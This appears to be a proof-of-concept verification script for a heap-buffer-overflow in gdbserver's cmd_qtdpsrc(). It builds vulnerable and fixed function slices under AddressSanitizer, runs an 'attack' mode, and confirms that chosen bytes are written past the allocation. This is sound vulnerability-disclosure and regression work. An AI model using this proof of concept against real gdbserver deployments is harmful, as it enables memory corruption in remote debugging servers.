#!/bin/bash
# CVE-2026-121997 — direct-call ASan + heap-canary harness for gdbserver
# cmd_qtdpsrc(). Every run re-extracts the verbatim pinned function and RSP
# helper slices and asserts SHA-256. No gdb build, no daemon, no network.
set -u
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E"
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt qtdpsrc_fn.inc \
      rsp_helpers.inc a-vuln-gcc a-vuln-clang a-fixed-gcc p-vuln
PASS=0
FAIL=0

ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
	if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
	if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
srcsha() { sha256sum "$1" | cut -d' ' -f1; }

# --- pinned bytes and verbatim slice assertions -----------------------------
[ "$(srcsha ../src/tracepoint-633ae02.cc)" = \
  942306a5b1f96693a64d18819973e7e306faa1481f373615487a5fd2b4df4e2e ] \
  && ok "pin-head-tracepoint-sha256" || no "pin-head-tracepoint-sha256"
[ "$(srcsha ../src/tracepoint-fixed.cc)" = \
  c3aa8ac26253ff3fa79d6dd9caa13ae09c5c6471cf3499b22fa5b0926af95f17 ] \
  && ok "fixed-snapshot-sha256" || no "fixed-snapshot-sha256"
[ "$(srcsha ../src/fix-head-633ae02.patch)" = \
  5b8bc3cb235eb2ced96da42b15c66ec7f2510deace6f5a943b7e567e8a67d43f ] \
  && ok "fix-patch-sha256" || no "fix-patch-sha256"
[ "$(srcsha ../src/rsp-low-633ae02.cc)" = \
  641d72c6c756fbc528adaa837c05d987656a4bea9df630d15a46823050ca6692 ] \
  && ok "pin-head-rsp-low-sha256" || no "pin-head-rsp-low-sha256"
extract_one() { # file, function-name regexp: include the exact return-type line
	awk -v re="$2" '{ if ($0 ~ re) { print prev; f = 1 } if (f) print;
	                   if (f && $0 ~ /^}/) exit; prev = $0 }' "$1"
}
extract_fn() { extract_one "$1" '^cmd_qtdpsrc \\(char \\*own_buf\\)'; }

[ "$(srcsha driver.c)" = \
  872d8e7dfbcc9e0349026b8daa1e77abec6aef875960eb3a4d051e0fc6d24a79 ] \
  && ok "driver-sha256" || no "driver-sha256"

extract_fn ../src/tracepoint-633ae02.cc > /tmp/qtdpsrc-vuln.inc
extract_fn ../src/tracepoint-fixed.cc > /tmp/qtdpsrc-fixed.inc
{ extract_one ../src/rsp-low-633ae02.cc '^ishex \\(int ch, int \\*val\\)';
  extract_one ../src/rsp-low-633ae02.cc '^unpack_varlen_hex \\(const char \\*buff'; } \
  > rsp_helpers.inc
SLICE_VULN=$(srcsha /tmp/qtdpsrc-vuln.inc)
SLICE_FIXED=$(srcsha /tmp/qtdpsrc-fixed.inc)
SLICE_RSP=$(srcsha rsp_helpers.inc)
printf 'SLICE_VULN_SHA256=%s\nSLICE_FIXED_SHA256=%s\nSLICE_RSP_SHA256=%s\n' \
  "$SLICE_VULN" "$SLICE_FIXED" "$SLICE_RSP"
[ "$SLICE_VULN" != "$SLICE_FIXED" ] && ok "vuln-fixed-slices-differ" \
  || no "vuln-fixed-slices-differ"
[ "$SLICE_VULN" = 99780c047e65cb687800e27b50525e8dd6202bfefecca13f954fae8b1aca6145 ] \
  && ok "verbatim-vulnerable-slice-sha256" || no "verbatim-vulnerable-slice-sha256"
[ "$SLICE_FIXED" = ec699708715aad2ac60a6316f2fc5beb128544280c6d6e50847ab451f3294f87 ] \
  && ok "verbatim-fixed-slice-sha256" || no "verbatim-fixed-slice-sha256"
[ "$SLICE_RSP" = b0bcd1a7a1bb77939a92547b01d78dc88e9a4d4a902af3ac63aebb2244a6e5d0 ] \
  && ok "verbatim-rsp-helpers-sha256" || no "verbatim-rsp-helpers-sha256"
[ "$(grep -cF 'xmalloc (slen + 1)' /tmp/qtdpsrc-vuln.inc)" = 1 ] \
  && ok "vuln-slice-has-uncapped-allocation" || no "vuln-slice-has-uncapped-allocation"
[ "$(grep -cF 'slen != len / 2' /tmp/qtdpsrc-fixed.inc)" = 1 ] \
  && ok "fixed-slice-has-length-check" || no "fixed-slice-has-length-check"
grep -qF 'static int' rsp_helpers.inc && ok "rsp-helper-ishex-present" \
  || no "rsp-helper-ishex-present"

GCCXX=g++
CLANGXX=clang++
command -v "$GCCXX" >/dev/null 2>&1 && ok "gxx-available" || no "gxx-available"
command -v "$CLANGXX" >/dev/null 2>&1 && ok "clangxx-available" || no "clangxx-available"

CFLAGS="-g -O0 -fno-omit-frame-pointer -fsanitize=address -std=c++17 -w"
build() { # out, compiler, slice
	cp "$3" qtdpsrc_fn.inc
	$2 $CFLAGS driver.c -o "$1" 2>"$E/build-$1.log"
}
build a-vuln-gcc "$GCCXX" /tmp/qtdpsrc-vuln.inc && ok "build-vuln-gxx-asan" \
  || no "build-vuln-gxx-asan"
if command -v "$CLANGXX" >/dev/null 2>&1; then
	build a-vuln-clang "$CLANGXX" /tmp/qtdpsrc-vuln.inc \
	  && ok "build-vuln-clangxx-asan" || no "build-vuln-clangxx-asan"
fi
build a-fixed-gcc "$GCCXX" /tmp/qtdpsrc-fixed.inc && ok "build-fixed-gxx-asan" \
  || no "build-fixed-gxx-asan"

cp /tmp/qtdpsrc-vuln.inc qtdpsrc_fn.inc
"$GCCXX" -g -O0 -fno-omit-frame-pointer -std=c++17 -w driver.c -o p-vuln \
  2>"$E/build-p-vuln.log" && ok "build-vuln-plain" || no "build-vuln-plain"

# --- rung 3: ASan heap-buffer-overflow in the verbatim function -------------
for n in 8 32 64 128; do
	./a-vuln-gcc attack "$n" >"$E/vuln-gcc-asan-$n.out" 2>&1; rc=$?
	f="$E/vuln-gcc-asan-$n.out"
	[ "$rc" -ne 0 ] && ok "vuln-gcc-$n-nonzero-exit" || no "vuln-gcc-$n-nonzero-exit"
	has "$f" "ERROR: AddressSanitizer: heap-buffer-overflow" \
	  "vuln-gcc-$n-asan-heap-overflow"
	has "$f" "WRITE of size 1" "vuln-gcc-$n-asan-write-1"
	has "$f" "cmd_qtdpsrc" "vuln-gcc-$n-frame-cmd-qtdpsrc"
	has "$f" "USEDLEN=$n DECLARED=1 EXPECTED_OOB=$((n - 2))" \
	  "vuln-gcc-$n-crafted-input"
done

if command -v "$CLANGXX" >/dev/null 2>&1; then
	./a-vuln-clang attack 64 >"$E/vuln-clang-asan.out" 2>&1; rc=$?
	f="$E/vuln-clang-asan.out"
	[ "$rc" -ne 0 ] && ok "vuln-clang-nonzero-exit" || no "vuln-clang-nonzero-exit"
	has "$f" "ERROR: AddressSanitizer: heap-buffer-overflow" \
	  "vuln-clang-asan-heap-overflow"
	has "$f" "WRITE of size 1" "vuln-clang-asan-write-1"
	has "$f" "cmd_qtdpsrc" "vuln-clang-frame-cmd-qtdpsrc"
fi

# --- controls: fixed snapshot rejects; safe packets clean ------------------
./a-fixed-gcc attack 64 >"$E/fixed-gcc-asan.out" 2>&1; rc=$?
f="$E/fixed-gcc-asan.out"
has "$f" "MODE=attack USEDLEN=64 DECLARED=1" "fixed-sees-same-attack"
has "$f" "RC=0 REPLY=E01 LIST_LEN=0" "fixed-rejects-attack"
hasnt "$f" "AddressSanitizer" "fixed-no-asan-report"
[ "$rc" -eq 0 ] && ok "fixed-clean-exit" || no "fixed-clean-exit"

./a-vuln-gcc safe 16 >"$E/vuln-gcc-safe.out" 2>&1; rc=$?
f="$E/vuln-gcc-safe.out"
has "$f" "RC=0 REPLY=OK LIST_LEN=1" "vuln-safe-clean-list"
hasnt "$f" "AddressSanitizer" "vuln-safe-no-asan"
[ "$rc" -eq 0 ] && ok "vuln-safe-clean-exit" || no "vuln-safe-clean-exit"

./a-fixed-gcc safe 16 >"$E/fixed-gcc-safe.out" 2>&1; rc=$?
f="$E/fixed-gcc-safe.out"
has "$f" "RC=0 REPLY=OK LIST_LEN=1" "fixed-safe-clean-list"
hasnt "$f" "AddressSanitizer" "fixed-safe-no-asan"
[ "$rc" -eq 0 ] && ok "fixed-safe-clean-exit" || no "fixed-safe-clean-exit"

# --- rung 4 (scoped): chosen decoded bytes land past the allocation --------
for n in 32 64; do
	for rep in 1 2; do
		PLAIN_MODE=1 ./p-vuln attack "$n" >"$E/plain-canary-$n-$rep.out" 2>&1
		rc=$?
		f="$E/plain-canary-$n-$rep.out"
		has "$f" "PLAIN N=$n DECLARED=1 ALLOC=2 WRITTEN=$((n - 2)) FIRST=2 LAST=$((n - 1)) PATTERN_OK=1" \
		  "plain-$n-$rep-chosen-bytes-past-allocation"
		[ "$rc" -eq 0 ] && ok "plain-$n-$rep-clean-exit" || no "plain-$n-$rep-clean-exit"
	done
done

# --- path-independent normalized content hash ------------------------------
cat "$E"/*.out 2>/dev/null \
  | grep -E '^(MODE=|RC=|PLAIN |SLICE_|ERROR: AddressSanitizer:|WRITE of size|SUMMARY: AddressSanitizer:|    #[0-9]+ .*cmd_qtdpsrc|    #[0-9]+ .*hex2bin)' \
  | sed -E -e 's/0x[0-9a-f]{6,}/0xADDR/g' \
           -e 's#/[^ ]*(driver\.c|qtdpsrc_fn\.inc)#PATH/\1#g' \
  > "$E/normalized.txt"
HASH=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'NORMALIZED_HASH=%s\n' "$HASH"
printf 'SUMMARY=%d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
